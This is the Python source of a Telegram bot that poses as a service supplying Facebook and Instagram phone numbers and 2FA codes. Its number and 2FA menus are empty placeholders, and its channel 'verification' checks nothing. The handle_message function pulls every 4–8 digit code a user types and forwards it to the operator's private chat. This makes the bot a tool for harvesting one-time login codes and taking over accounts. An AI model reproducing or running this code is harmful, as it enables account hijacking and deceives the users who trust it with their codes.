import logging
import re
import json
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, MessageHandler, filters, CallbackContext, CommandHandler, CallbackQueryHandler
from telegram.constants import ParseMode
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
YOUR_CHAT_ID = int(os.getenv("YOUR_CHAT_ID"))

OTP_PATTERN = re.compile(r'\b(\d{4,8})\b')
DATA_FILE = "authorized_users.json"

logging.basicConfig(level=logging.INFO)

def load_authorized():
    try:
        with open(DATA_FILE) as f:
            return set(json.load(f))
    except:
        return set()

def save_authorized(users):
    with open(DATA_FILE, 'w') as f:
        json.dump(list(users), f)

authorized_users = load_authorized()

main_keyboard = ReplyKeyboardMarkup([
    [KeyboardButton("🎲 GET NUMBER"), KeyboardButton("🔐 2FA CODE")]
], resize_keyboard=True, is_persistent=True)

join_keyboard = InlineKeyboardMarkup([
    [InlineKeyboardButton("📢 Join Channel 1", url="https://t.me/EASY_MARKETING1")],
    [InlineKeyboardButton("📢 Join Channel 2", url="https://t.me/EASY_METHOD1")],
    [InlineKeyboardButton("✅ Verify", callback_data="verify")]
])

# Services for GET NUMBER
number_services = InlineKeyboardMarkup([
    [InlineKeyboardButton("📘 Facebook Number", callback_data="num_fb")],
    [InlineKeyboardButton("📸 Instagram Number", callback_data="num_ig")],
    [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
])

# Services for 2FA CODE
twofa_services = InlineKeyboardMarkup([
    [InlineKeyboardButton("📘 Facebook 2FA", callback_data="2fa_fb")],
    [InlineKeyboardButton("📸 Instagram 2FA", callback_data="2fa_ig")],
    [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
])

async def start(update: Update, context: CallbackContext):
    if update.effective_user.id in authorized_users:
        await update.message.reply_text("✅ Welcome! Choose option below.", reply_markup=main_keyboard)
    else:
        await update.message.reply_text("🔒 Join channels then Verify", reply_markup=join_keyboard)

async def verify(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    authorized_users.add(user_id)
    save_authorized(authorized_users)
    await query.message.delete()
    await context.bot.send_message(user_id, "✅ Verified successfully!\nUse the buttons.", reply_markup=main_keyboard)

async def handle_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    text = update.message.text

    if user_id not in authorized_users:
        await update.message.reply_text("Verify করুন।", reply_markup=join_keyboard)
        return

    if text == "🎲 GET NUMBER":
        await update.message.reply_text("🔍 Select Number Service:", reply_markup=number_services)
    elif text == "🔐 2FA CODE":
        await update.message.reply_text("🔐 Select 2FA Service:", reply_markup=twofa_services)
    else:
        otps = OTP_PATTERN.findall(text)
        if otps:
            for otp in otps:
                await context.bot.send_message(YOUR_CHAT_ID, f"🔥 OTP Detected: `{otp}`", parse_mode=ParseMode.MARKDOWN)

async def callback_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == "num_fb":
        await query.message.edit_text("📘 **Facebook Number** Selected.\nWaiting for number...")
    elif data == "num_ig":
        await query.message.edit_text("📸 **Instagram Number** Selected.\nWaiting for number...")
    elif data == "2fa_fb":
        await query.message.edit_text("📘 **Facebook 2FA** Selected.\nSend 2FA code when received.")
    elif data == "2fa_ig":
        await query.message.edit_text("📸 **Instagram 2FA** Selected.\nSend 2FA code when received.")
    elif data == "back_main":
        await query.message.edit_text("🏠 Main Menu", reply_markup=main_keyboard)

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(verify, pattern="verify"))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🚀 SUPER FIRE OTP BOT is Running...")
    app.run_polling()

if __name__ == '__main__':
    main()
